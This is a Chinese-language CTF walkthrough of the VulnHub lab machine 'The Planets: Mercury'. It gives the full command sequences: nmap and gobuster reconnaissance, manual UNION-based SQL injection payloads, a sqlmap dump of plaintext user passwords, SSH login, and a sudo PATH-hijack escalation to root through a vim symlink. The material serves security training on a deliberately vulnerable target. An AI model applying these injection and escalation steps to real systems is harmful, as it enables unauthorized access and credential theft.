# THE PLANETS: MERCURY主机渗透实现

- 靶机地址：https://www.vulnhub.com/entry/the-planets-mercury,544/
- 下载地址：https://download.vulnhub.com/theplanets/Mercury.ova



##  信息收集：

### 主机发现

- 当前主机IP段：`192.168.56.1/24`,当前主机IP为：`192.168.56.101`

- ```shell
  └─$ sudo nmap -sn 192.168.56.0/24 --min-rate 10000                         
  [sudo] password for kali: 
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-19 20:08 EDT
  Nmap scan report for 192.168.56.1
  Host is up (0.00042s latency).
  MAC Address: 0A:00:27:00:00:31 (Unknown)
  Nmap scan report for 192.168.56.100
  Host is up (0.00022s latency).
  MAC Address: 08:00:27:43:75:39 (Oracle VirtualBox virtual NIC)
  Nmap scan report for 192.168.56.102
  Host is up (0.00059s latency).
  MAC Address: 08:00:27:1E:20:E4 (Oracle VirtualBox virtual NIC)
  Nmap scan report for 192.168.56.101
  Host is up.
  Nmap done: 256 IP addresses (4 hosts up) scanned in 22.42 seconds
  
  ```

- 靶机IP地址：`192.168.56.102`

### 端口扫描

- TCP扫描

- ```shell
  └─$ sudo nmap -sT --min-rate 10000 -p- 192.168.56.102 -oA Nmap-scan/sT
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-19 20:10 EDT
  Nmap scan report for 192.168.56.102
  Host is up (0.013s latency).
  Not shown: 65533 closed tcp ports (conn-refused)
  PORT     STATE SERVICE
  22/tcp   open  ssh
  8080/tcp open  http-proxy
  MAC Address: 08:00:27:1E:20:E4 (Oracle VirtualBox virtual NIC)
  
  Nmap done: 1 IP address (1 host up) scanned in 19.49 seconds
  ```

- UDP扫描

- ```shell
  └─$ sudo nmap -sU --min-rate 10000 -p- 192.168.56.102 -oA Nmap-scan/sU
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-19 20:12 EDT
  Warning: 192.168.56.102 giving up on port because retransmission cap hit (10).
  Nmap scan report for 192.168.56.102
  Host is up (0.00043s latency).
  All 65535 scanned ports on 192.168.56.102 are in ignored states.
  Not shown: 65437 open|filtered udp ports (no-response), 98 closed udp ports (port-unreach)
  MAC Address: 08:00:27:1E:20:E4 (Oracle VirtualBox virtual NIC)
  
  Nmap done: 1 IP address (1 host up) scanned in 104.55 seconds
  ```

### 服务及操作系统扫描

- ```shell
  └─$ sudo nmap -sC -sV -O -p22,8080 192.168.56.102 -oA Nmap-scan/sC  
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-19 20:16 EDT
  Nmap scan report for 192.168.56.102
  Host is up (0.00047s latency).
  
  PORT     STATE SERVICE    VERSION
  22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   3072 c8:24:ea:2a:2b:f1:3c:fa:16:94:65:bd:c7:9b:6c:29 (RSA)
  |   256 e8:08:a1:8e:7d:5a:bc:5c:66:16:48:24:57:0d:fa:b8 (ECDSA)
  |_  256 2f:18:7e:10:54:f7:b9:17:a2:11:1d:8f:b3:30:a5:2a (ED25519)
  8080/tcp open  http-proxy WSGIServer/0.2 CPython/3.8.2
  |_http-title: Site doesn't have a title (text/html; charset=utf-8).
  | http-robots.txt: 1 disallowed entry 
  |_/
  | fingerprint-strings: 
  |   FourOhFourRequest: 
  |     HTTP/1.1 404 Not Found
  |     Date: Sun, 20 Aug 2023 00:16:27 GMT
  |     Server: WSGIServer/0.2 CPython/3.8.2
  |     Content-Type: text/html
  |     X-Frame-Options: DENY
  |     Content-Length: 2366
  |     X-Content-Type-Options: nosniff
  |     Referrer-Policy: same-origin
  |     <!DOCTYPE html>
  |     <html lang="en">
  |     <head>
  |     <meta http-equiv="content-type" content="text/html; charset=utf-8">
  |     <title>Page not found at /nice ports,/Trinity.txt.bak</title>
  |     <meta name="robots" content="NONE,NOARCHIVE">
  |     <style type="text/css">
  |     html * { padding:0; margin:0; }
  |     body * { padding:10px 20px; }
  |     body * * { padding:0; }
  |     body { font:small sans-serif; background:#eee; color:#000; }
  |     body>div { border-bottom:1px solid #ddd; }
  |     font-weight:normal; margin-bottom:.4em; }
  |     span { font-size:60%; color:#666; font-weight:normal; }
  |     table { border:none; border-collapse: collapse; width:100%; }
  |     vertical-align:
  |   GetRequest, HTTPOptions: 
  |     HTTP/1.1 200 OK
  |     Date: Sun, 20 Aug 2023 00:16:27 GMT
  |     Server: WSGIServer/0.2 CPython/3.8.2
  |     Content-Type: text/html; charset=utf-8
  |     X-Frame-Options: DENY
  |     Content-Length: 69
  |     X-Content-Type-Options: nosniff
  |     Referrer-Policy: same-origin
  |     Hello. This site is currently in development please check back later.
  |   RTSPRequest: 
  |     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
  |     "http://www.w3.org/TR/html4/strict.dtd">
  |     <html>
  |     <head>
  |     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
  |     <title>Error response</title>
  |     </head>
  |     <body>
  |     <h1>Error response</h1>
  |     <p>Error code: 400</p>
  |     <p>Message: Bad request version ('RTSP/1.0').</p>
  |     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
  |     </body>
  |_    </html>
  |_http-server-header: WSGIServer/0.2 CPython/3.8.2
  1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
  SF-Port8080-TCP:V=7.94%I=7%D=8/19%Time=64E15B5B%P=x86_64-pc-linux-gnu%r(Ge
  SF:tRequest,135,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sun,\x2020\x20Aug\x202
  SF:023\x2000:16:27\x20GMT\r\nServer:\x20WSGIServer/0\.2\x20CPython/3\.8\.2
  SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nX-Frame-Options:\x2
  SF:0DENY\r\nContent-Length:\x2069\r\nX-Content-Type-Options:\x20nosniff\r\
  SF:nReferrer-Policy:\x20same-origin\r\n\r\nHello\.\x20This\x20site\x20is\x
  SF:20currently\x20in\x20development\x20please\x20check\x20back\x20later\."
  SF:)%r(HTTPOptions,135,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Sun,\x2020\x20A
  SF:ug\x202023\x2000:16:27\x20GMT\r\nServer:\x20WSGIServer/0\.2\x20CPython/
  SF:3\.8\.2\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nX-Frame-Opti
  SF:ons:\x20DENY\r\nContent-Length:\x2069\r\nX-Content-Type-Options:\x20nos
  SF:niff\r\nReferrer-Policy:\x20same-origin\r\n\r\nHello\.\x20This\x20site\
  SF:x20is\x20currently\x20in\x20development\x20please\x20check\x20back\x20l
  SF:ater\.")%r(RTSPRequest,1F4,"<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DT
  SF:D\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x20\x20\"http://www\
  SF:.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x20\x20<head>\n\x20\
  SF:x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20cont
  SF:ent=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<titl
  SF:e>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<
  SF:body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x20
  SF:\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x20\
  SF:x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20version\x20\('RTSP/
  SF:1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20expl
  SF:anation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20request\x20syntax\x2
  SF:0or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n"
  SF:)%r(FourOhFourRequest,A28,"HTTP/1\.1\x20404\x20Not\x20Found\r\nDate:\x2
  SF:0Sun,\x2020\x20Aug\x202023\x2000:16:27\x20GMT\r\nServer:\x20WSGIServer/
  SF:0\.2\x20CPython/3\.8\.2\r\nContent-Type:\x20text/html\r\nX-Frame-Option
  SF:s:\x20DENY\r\nContent-Length:\x202366\r\nX-Content-Type-Options:\x20nos
  SF:niff\r\nReferrer-Policy:\x20same-origin\r\n\r\n<!DOCTYPE\x20html>\n<htm
  SF:l\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20http-equiv=\"content-type\"
  SF:\x20content=\"text/html;\x20charset=utf-8\">\n\x20\x20<title>Page\x20no
  SF:t\x20found\x20at\x20/nice\x20ports,/Trinity\.txt\.bak</title>\n\x20\x20
  SF:<meta\x20name=\"robots\"\x20content=\"NONE,NOARCHIVE\">\n\x20\x20<style
  SF:\x20type=\"text/css\">\n\x20\x20\x20\x20html\x20\*\x20{\x20padding:0;\x
  SF:20margin:0;\x20}\n\x20\x20\x20\x20body\x20\*\x20{\x20padding:10px\x2020
  SF:px;\x20}\n\x20\x20\x20\x20body\x20\*\x20\*\x20{\x20padding:0;\x20}\n\x2
  SF:0\x20\x20\x20body\x20{\x20font:small\x20sans-serif;\x20background:#eee;
  SF:\x20color:#000;\x20}\n\x20\x20\x20\x20body>div\x20{\x20border-bottom:1p
  SF:x\x20solid\x20#ddd;\x20}\n\x20\x20\x20\x20h1\x20{\x20font-weight:normal
  SF:;\x20margin-bottom:\.4em;\x20}\n\x20\x20\x20\x20h1\x20span\x20{\x20font
  SF:-size:60%;\x20color:#666;\x20font-weight:normal;\x20}\n\x20\x20\x20\x20
  SF:table\x20{\x20border:none;\x20border-collapse:\x20collapse;\x20width:10
  SF:0%;\x20}\n\x20\x20\x20\x20td,\x20th\x20{\x20vertical-align:");
  MAC Address: 08:00:27:1E:20:E4 (Oracle VirtualBox virtual NIC)
  Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
  Device type: general purpose
  Running: Linux 4.X|5.X
  OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
  OS details: Linux 4.15 - 5.8
  Network Distance: 1 hop
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  
  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 108.20 seconds
  ```

### 基础漏洞扫描

- ```shell
  └─$ sudo nmap --script=vuln -p22,8080 192.168.56.102 -oA Nmap-scan/Script 
  Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-19 20:32 EDT
  Pre-scan script results:
  | broadcast-avahi-dos: 
  |   Discovered hosts:
  |     224.0.0.251
  |   After NULL UDP avahi packet DoS (CVE-2011-1002).
  |_  Hosts are all up (not vulnerable).
  Nmap scan report for 192.168.56.102
  Host is up (0.00092s latency).
  
  PORT     STATE SERVICE
  22/tcp   open  ssh
  8080/tcp open  http-proxy
  | http-slowloris-check: 
  |   VULNERABLE:
  |   Slowloris DOS attack
  |     State: LIKELY VULNERABLE
  |     IDs:  CVE:CVE-2007-6750
  |       Slowloris tries to keep many connections to the target web server open and hold
  |       them open as long as possible.  It accomplishes this by opening connections to
  |       the target web server and sending a partial request. By doing so, it starves
  |       the http server's resources causing Denial Of Service.
  |       
  |     Disclosure date: 2009-09-17
  |     References:
  |       http://ha.ckers.org/slowloris/
  |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
  | http-enum: 
  |_  /robots.txt: Robots file
  MAC Address: 08:00:27:1E:20:E4 (Oracle VirtualBox virtual NIC)
  
  Nmap done: 1 IP address (1 host up) scanned in 559.58 seconds
  ```

## web信息收集：

- 默认页面
- ![image-20230820082317223](https://raw.githubusercontent.com/r0o983/images/main/202308200823280.png)

### 目录发现

#### 使用`gobuster`进行目录扫描

- ```shell
  └─$ gobuster dir -u http://192.168.56.102:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php -o the-planets-mercury/gobuster    
  ===============================================================
  Gobuster v3.6
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://192.168.56.102:8080/
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.6
  [+] Extensions:              txt,php
  [+] Timeout:                 10s
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /robots.txt           (Status: 200) [Size: 26]
  Progress: 661680 / 661683 (100.00%)
  ===============================================================
  Finished
  ===============================================================
  ```

- 手工猜目录
- ![image-20230820101111602](https://raw.githubusercontent.com/r0o983/images/main/202308201011685.png)
- 发现了一个新目录-->`mercuryfacts/`，尝试访问发现下面还存在两个路径，依次访问查看其内容
- ![image-20230820102837409](https://raw.githubusercontent.com/r0o983/images/main/202308201028575.png)

- 当前使用id号码来进行指定事项，可能存在sql注入
- ![image-20230820103227008](https://raw.githubusercontent.com/r0o983/images/main/202308201032056.png)
- 加上单引号之后爆出了语句错误，同时页面展示出了当前使用的sql语句
- ![image-20230820103610169](https://raw.githubusercontent.com/r0o983/images/main/202308201036247.png)

#### sql注入

- 首先获取当前用户的数据库，版本信息，以及当前连接的用户-->`union select group_concat(database(),version(),user()) -- '`
- ![image-20230820105040822](https://raw.githubusercontent.com/r0o983/images/main/202308201050886.png)
- 查看系统中存在有那几个库`union select group_concat(schema_name) from information_schema.schemate -- '` --> schemate（表），当前表内存的数据是当前mysql系统中所有的数据库信息。
- ![image-20230820105737832](https://raw.githubusercontent.com/r0o983/images/main/202308201057911.png)
- 查找当前数据库`mercury`中存在那几张表` union select group_concat(table_name) from information_schema.tables where table_schema = 'mercury' -- '`--> table_schema(列)，information_schema.tables这张表内的数据中的字段为table_schema中查找属于mercury这一列的数据
- ![image-20230820110324903](https://raw.githubusercontent.com/r0o983/images/main/202308201103964.png)
- 查找当前表`facts`和`users`中的列信息`union select group_concat(column_name) from information_schema.columns where table_name= 'users' -- '`--> table_name(列），当前columns表中查询table_name这一列中属于users这一列的信息
- ![image-20230820112457542](https://raw.githubusercontent.com/r0o983/images/main/202308201124602.png)
- 读取`users`表中三个字段的值`union select group_concat(id,0x3a,username,0x3a,password) from users -- '`
- ![image-20230820125940954](https://raw.githubusercontent.com/r0o983/images/main/202308201259034.png)
- 尝试使用已获得的账号密码进行ssh登录



#### sqlmap

- 参数：
  1. dbs：指定数据库类型
  2. -D 指定数据库名
  3. -T 指定表名
  4. --dump 导出已获得的信息
  5. -batch 不需要进行询问，由系统进行判断

- ```shell
  └─$ sudo sqlmap -u http://192.168.56.102:8080/mercuryfacts/5 --dbs mysql  -D mercury -T users --dump -batch 
  
  [20:49:14] [INFO] the back-end DBMS is MySQL
  back-end DBMS: MySQL >= 5.6
  [20:49:14] [INFO] fetching database names
  available databases [2]:
  [*] information_schema
  [*] mercury
  
  [20:49:14] [INFO] fetching columns for table 'users' in database 'mercury'
  [20:49:14] [WARNING] reflective value(s) found and filtering out
  [20:49:14] [INFO] fetching entries for table 'users' in database 'mercury'
  Database: mercury
  Table: users
  [4 entries]
  +----+-------------------------------+-----------+
  | id | password                      | username  |
  +----+-------------------------------+-----------+
  | 1  | johnny1987                    | john      |
  | 2  | lovemykids111                 | laura     |
  | 3  | lovemybeer111                 | sam       |
  | 4  | mercuryisthesizeof0.056Earths | webmaster |
  +----+-------------------------------+-----------+
  
  [20:49:14] [INFO] table 'mercury.users' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.56.102/dump/mercury/users.csv'                                                                                                     
  [20:49:14] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.56.102'
  
  [*] ending @ 20:49:14 /2023-08-19/
  ```

## 获得初始shell

- 经过测试，发现webmaster可以ssh登录到系统：`webmaster:mercuryisthesizeof0.056Earths`

- 获取第一个flag

- ```shell
  └─$ ssh webmaster@192.168.56.102
  webmaster@192.168.56.102's password: 
  Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-45-generic x86_64)
  
   * Documentation:  https://help.ubuntu.com
   * Management:     https://landscape.canonical.com
   * Support:        https://ubuntu.com/advantage
  
    System information as of Sun 20 Aug 05:07:00 UTC 2023
  
    System load:  0.0               Processes:               105
    Usage of /:   76.8% of 4.86GB   Users logged in:         0
    Memory usage: 32%               IPv4 address for enp0s3: 192.168.56.102
    Swap usage:   0%
  
  
  22 updates can be installed immediately.
  0 of these updates are security updates.
  To see these additional updates run: apt list --upgradable
  
  
  The list of available updates is more than a week old.
  To check for new updates run: sudo apt update
  Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
  
  
  Last login: Sun Aug 20 00:49:44 2023 from 192.168.56.101
  webmaster@mercury:~$ ip a
  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
      inet 127.0.0.1/8 scope host lo
         valid_lft forever preferred_lft forever
      inet6 ::1/128 scope host 
         valid_lft forever preferred_lft forever
  2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
      link/ether 08:00:27:1e:20:e4 brd ff:ff:ff:ff:ff:ff
      inet 192.168.56.102/24 brd 192.168.56.255 scope global dynamic enp0s3
         valid_lft 438sec preferred_lft 438sec
      inet6 fe80::a00:27ff:fe1e:20e4/64 scope link 
         valid_lft forever preferred_lft forever
  webmaster@mercury:~$ uname -a
  Linux mercury 5.4.0-45-generic #49-Ubuntu SMP Wed Aug 26 13:38:52 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
  webmaster@mercury:~$ id
  uid=1001(webmaster) gid=1001(webmaster) groups=1001(webmaster)
  webmaster@mercury:~$ whoami
  webmaster
  webmaster@mercury:~$ sudo -l
  [sudo] password for webmaster: 
  Sorry, user webmaster may not run sudo on mercury.
  webmaster@mercury:~$ cat user_flag.txt 
  [user_flag_8339915c9a454657bd60ee58776f4ccd]
  ```

- 当前用户无法使用`sudo -l`查看权限

## 提权

- 在当前用户目录中发现另一个管理员账号，根据名称推测该账号比当前账号权限更高。 将密文使用base64进行解码

- ```shell
  webmaster@mercury:~$ pwd
  /home/webmaster
  webmaster@mercury:~$ cd mercury_proj/
  webmaster@mercury:~/mercury_proj$ ls
  db.sqlite3  manage.py  mercury_facts  mercury_index  mercury_proj  notes.txt
  webmaster@mercury:~/mercury_proj$ ls -lhai
  total 28K
  162261 drwxrwxr-x 5 webmaster webmaster 4.0K Aug 28  2020 .
   35299 drwx------ 4 webmaster webmaster 4.0K Aug 20 05:14 ..
  165898 -rw-r--r-- 1 webmaster webmaster    0 Aug 27  2020 db.sqlite3
  165900 -rwxr-xr-x 1 webmaster webmaster  668 Aug 27  2020 manage.py
  165882 drwxrwxr-x 6 webmaster webmaster 4.0K Sep  1  2020 mercury_facts
  165766 drwxrwxr-x 4 webmaster webmaster 4.0K Aug 28  2020 mercury_index
  165765 drwxrwxr-x 3 webmaster webmaster 4.0K Aug 28  2020 mercury_proj
  166251 -rw------- 1 webmaster webmaster  196 Aug 28  2020 notes.txt
  webmaster@mercury:~/mercury_proj$ cat notes.txt 
  Project accounts (both restricted):
  webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK
  linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==
  webmaster@mercury:~/mercury_proj$ 
  
  ```

- 成功切换到`linuxmaster`用户

- ```shell
  webmaster@mercury:~/mercury_proj$ echo "bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==" | base64 -d
  mercurymeandiameteris4880km
  webmaster@mercury:~/mercury_proj$ su linuxmaster
  Password: 
  linuxmaster@mercury:/home/webmaster/mercury_proj$ whoami
  linuxmaster
  linuxmaster@mercury:/home/webmaster/mercury_proj$ id
  uid=1002(linuxmaster) gid=1002(linuxmaster) groups=1002(linuxmaster),1003(viewsyslog)
  linuxmaster@mercury:/home/webmaster/mercury_proj$ ip a
  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
      inet 127.0.0.1/8 scope host lo
         valid_lft forever preferred_lft forever
      inet6 ::1/128 scope host 
         valid_lft forever preferred_lft forever
  2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
      link/ether 08:00:27:1e:20:e4 brd ff:ff:ff:ff:ff:ff
      inet 192.168.56.102/24 brd 192.168.56.255 scope global dynamic enp0s3
         valid_lft 578sec preferred_lft 578sec
      inet6 fe80::a00:27ff:fe1e:20e4/64 scope link 
         valid_lft forever preferred_lft forever
  linuxmaster@mercury:/home/webmaster/mercury_proj$ sudo -l
  Matching Defaults entries for linuxmaster on mercury:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User linuxmaster may run the following commands on mercury:
      (root : root) SETENV: /usr/bin/check_syslog.sh
  ```

- 查看文件内容--> 使用tail动态显示10行系统日志。

- ```shell
  linuxmaster@mercury:~$ sudo -l
  [sudo] password for linuxmaster: 
  Matching Defaults entries for linuxmaster on mercury:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User linuxmaster may run the following commands on mercury:
      (root : root) SETENV: /usr/bin/check_syslog.sh
  linuxmaster@mercury:~$ cat /usr/bin/check_syslog.sh 
  #!/bin/bash
  tail -n 10 /var/log/syslog
  
  ```

- 使用软连接将`vi`或者`vim`链接到tail，再将当前路径添加到环境变量中，这一步的操作是为了让用户在执行命令时，优先使用当前路径下的同名文件。`ln -s /bin/vim tail`

- ```shell
  linuxmaster@mercury:~$ ls -lhai
  total 28K
  162165 drwx------ 3 linuxmaster linuxmaster 4.0K Aug 20 05:34 .
      18 drwxr-xr-x 5 root        root        4.0K Aug 28  2020 ..
  165762 lrwxrwxrwx 1 linuxmaster linuxmaster    9 Sep  1  2020 .bash_history -> /dev/null
  165896 -rw-r--r-- 1 linuxmaster linuxmaster  220 Aug 28  2020 .bash_logout
  162221 -rw-r--r-- 1 linuxmaster linuxmaster 3.7K Aug 28  2020 .bashrc
  165920 drwx------ 2 linuxmaster linuxmaster 4.0K Aug 28  2020 .cache
  166244 -rw-r--r-- 1 linuxmaster linuxmaster  807 Aug 28  2020 .profile
  162227 lrwxrwxrwx 1 linuxmaster linuxmaster    8 Aug 20 05:31 tail -> /bin/vim
  162263 -rw------- 1 linuxmaster linuxmaster 1.2K Aug 20 05:34 .viminfo
  linuxmaster@mercury:~$ echo $PATH
  /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
  linuxmaster@mercury:~$ export PATH=.:$PATH
  linuxmaster@mercury:~$ echo $PATH
  .:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
  linuxmaster@mercury:~$ sudo --preserve-env=PATH /usr/bin/check_syslog.sh 
  ```

- 进入`vi or vim`界面后使用`:!bash`启动一个新的终端即可完成提权

- ```shell
  linuxmaster@mercury:~$ sudo --preserve-env=PATH /usr/bin/check_syslog.sh 
  2 files to edit
  
  root@mercury:/home/linuxmaster# uname -a
  Linux mercury 5.4.0-45-generic #49-Ubuntu SMP Wed Aug 26 13:38:52 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
  root@mercury:/home/linuxmaster# ip a
  1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
      link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
      inet 127.0.0.1/8 scope host lo
         valid_lft forever preferred_lft forever
      inet6 ::1/128 scope host 
         valid_lft forever preferred_lft forever
  2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
      link/ether 08:00:27:1e:20:e4 brd ff:ff:ff:ff:ff:ff
      inet 192.168.56.102/24 brd 192.168.56.255 scope global dynamic enp0s3
         valid_lft 499sec preferred_lft 499sec
      inet6 fe80::a00:27ff:fe1e:20e4/64 scope link 
         valid_lft forever preferred_lft forever
  root@mercury:/home/linuxmaster# id
  uid=0(root) gid=0(root) groups=0(root)
  root@mercury:/home/linuxmaster# cd /root
  root@mercury:~# ls -lhai
  total 56K
      21 drwx------  5 root root 4.0K Aug 20 05:45 .
       2 drwxr-xr-x 19 root root 4.0K Sep  1  2020 ..
   35303 -rw-------  1 root root 3.2K Aug 20 05:44 .bash_history
     261 -rw-r--r--  1 root root 3.1K Dec  5  2019 .bashrc
   35306 drwxr-xr-x  3 root root 4.0K Aug 27  2020 .cache
    8728 -rw-------  1 root root   34 Sep  1  2020 .lesshst
  166274 drwxr-xr-x  3 root root 4.0K Aug 28  2020 .local
     150 -rw-------  1 root root 3.6K Sep  1  2020 .mysql_history
     262 -rw-r--r--  1 root root  161 Dec  5  2019 .profile
    9010 -rw-------  1 root root 1.2K Sep  2  2020 root_flag.txt
   34271 drwx------  2 root root 4.0K Aug 27  2020 .ssh
    8723 -rw-------  1 root root 9.2K Aug 20 05:45 .viminfo
  root@mercury:~# cat root_flag.txt 
  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  @@@@@@@@@@@@@@@@@@@/##////////@@@@@@@@@@@@@@@@@@@@
  @@@@@@@@@@@@@@(((/(*(/((((((////////&@@@@@@@@@@@@@
  @@@@@@@@@@@((#(#(###((##//(((/(/(((*((//@@@@@@@@@@
  @@@@@@@@/#(((#((((((/(/,*/(((///////(/*/*/#@@@@@@@
  @@@@@@*((####((///*//(///*(/*//((/(((//**/((&@@@@@
  @@@@@/(/(((##/*((//(#(////(((((/(///(((((///(*@@@@
  @@@@/(//((((#(((((*///*/(/(/(((/((////(/*/*(///@@@
  @@@//**/(/(#(#(##((/(((((/(**//////////((//((*/#@@
  @@@(//(/((((((#((((#*/((///((///((//////(/(/(*(/@@
  @@@((//((((/((((#(/(/((/(/(((((#((((((/(/((/////@@
  @@@(((/(((/##((#((/*///((/((/((##((/(/(/((((((/*@@
  @@@(((/(##/#(((##((/((((((/(##(/##(#((/((((#((*%@@
  @@@@(///(#(((((#(#(((((#(//((#((###((/(((((/(//@@@
  @@@@@(/*/(##(/(###(((#((((/((####/((((///((((/@@@@
  @@@@@@%//((((#############((((/((/(/(*/(((((@@@@@@
  @@@@@@@@%#(((############(##((#((*//(/(*//@@@@@@@@
  @@@@@@@@@@@/(#(####(###/((((((#(///((//(@@@@@@@@@@
  @@@@@@@@@@@@@@@(((###((#(#(((/((///*@@@@@@@@@@@@@@
  @@@@@@@@@@@@@@@@@@@@@@@%#(#%@@@@@@@@@@@@@@@@@@@@@@
  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
  
  Congratulations on completing Mercury!!!
  If you have any feedback please contact me at SirFlash@protonmail.com
  [root_flag_69426d9fda579afbffd9c2d47ca31d90]
  root@mercury:~# 
  ```
